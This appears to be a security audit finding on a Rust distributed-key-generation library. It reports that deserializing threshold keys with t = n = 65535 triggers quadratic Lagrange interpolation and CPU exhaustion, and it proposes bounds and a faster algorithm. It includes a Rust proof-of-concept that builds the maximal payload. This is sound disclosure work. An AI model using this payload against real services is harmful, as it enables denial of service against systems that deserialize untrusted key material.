### Title
Quadratic threshold-key deserialization enables CPU exhaustion - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` accepts attacker-controlled `t` and `n` values and deserializes `n` verification shares. For Lagrange interpolation, `ThresholdKeys::new` then calculates an interpolation factor for each of `t` participants, while each calculation iterates over all `t` participants and performs a field inversion, resulting in `O(t²)` work. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Finding Description
The serialized format contains attacker-controlled `t`, `n`, participant index, interpolation variant, secret share, and `n` verification shares. [1](#0-0) [5](#0-4) 

`ThresholdParams::new` permits any nonzero `t <= n`, including the maximum `t = n = 65535`. [6](#0-5) 

When Lagrange interpolation is selected, `ThresholdKeys::new` builds the participant list `1..=t` and calls `interpolation_factor` for every participant. [3](#0-2) 

Each Lagrange `interpolation_factor` call iterates over the complete participant list and computes a field inversion. [4](#0-3) 

The deserializer also performs `n` canonical elliptic-point decodings, each of which calls `from_bytes` and compares a re-encoding. [7](#0-6) 

### Impact Explanation
An untrusted serialized `ThresholdKeys` object of only a few megabytes can request `t = n = 65535`, forcing approximately `4,294,836,225` inner-loop field operations and `65,535` field inversions during group-key reconstruction. [3](#0-2) [4](#0-3) 

This is a remotely triggerable CPU-exhaustion condition wherever untrusted bytes are passed to `ThresholdKeys::read`, matching the resource-exhaustion bug class with a Medium severity impact. [8](#0-7) 

### Likelihood Explanation
The input is considered reachable because `ThresholdKeys::read` is an explicit deserialization boundary for untrusted bytes, and the payload does not require malformed scalars, malformed points, invalid parameters, duplicates, or cooperation from another party. [8](#0-7) 

The likelihood is limited to deployments that deserialize threshold-key material supplied by an untrusted source rather than exclusively locally generated keys. [9](#0-8) 

### Recommendation
Enforce a protocol-appropriate maximum `n` and `t` before allocating vectors or decoding verification shares, and reject values above that bound even if they fit in `u16`. [1](#0-0) 

Replace the per-participant Lagrange recomputation with an algorithm that derives all interpolation factors in sub-quadratic or near-linear time, or cap `t` low enough that the quadratic behavior is harmless. [4](#0-3) [3](#0-2) 

### Proof of Concept
The following serialized object is structurally valid and requests the maximum Lagrange interpolation workload:

```rust
// C is an in-scope Ciphersuite implementation.
let mut payload = Vec::new();

// Curve identifier.
payload.extend_from_slice(
  &u32::try_from(C::ID.len()).unwrap().to_le_bytes(),
);
payload.extend_from_slice(C::ID);

// Valid parameters: t = n = u16::MAX, i = 1.
payload.extend_from_slice(&u16::MAX.to_le_bytes());
payload.extend_from_slice(&u16::MAX.to_le_bytes());
payload.extend_from_slice(&1u16.to_le_bytes());

// Interpolation::Lagrange.
payload.push(1);

// Canonical scalar for secret_share.
payload.extend_from_slice(C::F::ONE.to_repr().as_ref());

// n canonical group encodings for verification_shares.
let point = C::generator().to_bytes();
for _ in 0 .. u16::MAX {
  payload.extend_from_slice(point.as_ref());
}

// ThresholdKeys::new computes 65,535 Lagrange factors;
// each factor scans all 65,535 included participants.
let _ = ThresholdKeys::<C>::read(&mut payload.as_slice());
```

This reaches the quadratic path through `ThresholdKeys::new` after only `65,535` encoded points and one encoded scalar. [10](#0-9) [3](#0-2)

### Citations

**File:** crypto/dkg/src/lib.rs (L164-179)
```rust
impl ThresholdParams {
  /// Create a new set of parameters.
  pub const fn new(t: u16, n: u16, i: Participant) -> Result<ThresholdParams, DkgError> {
    if (t == 0) || (n == 0) {
      return Err(DkgError::ZeroParameter { t, n });
    }

    if t > n {
      return Err(DkgError::InvalidThreshold { t, n });
    }
    if i.0 > n {
      return Err(DkgError::InvalidParticipant { n, participant: i });
    }

    Ok(ThresholdParams { t, n, i })
  }
```

**File:** crypto/dkg/src/lib.rs (L230-246)
```rust
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L573-631)
```rust
  /// Read keys from a type satisfying `std::io::Read`.
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```
